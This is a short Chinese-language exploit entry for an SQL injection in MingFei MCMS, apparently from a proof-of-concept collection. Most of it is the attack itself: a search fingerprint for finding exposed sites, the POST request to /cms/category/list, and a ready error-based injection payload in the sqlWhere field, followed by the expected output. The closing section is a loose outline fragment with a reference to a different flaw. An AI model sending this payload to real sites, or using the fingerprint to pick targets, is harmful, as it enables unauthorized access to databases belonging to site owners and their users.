# 铭飞CMScategory-list存在SQL注入漏洞

- **系统**：铭飞　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="铭飞MCMS"`
- **请求**：`POST /cms/category/list HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x5c,0x717a6a6271,(select md5(1)),0x716b6a7871))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]

qzjbqc4ca4238a0b923820dcc509a6f
```

**其他**
- 铭飞CMS category-list存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 铭飞CMS dict-list存在SQL注入漏洞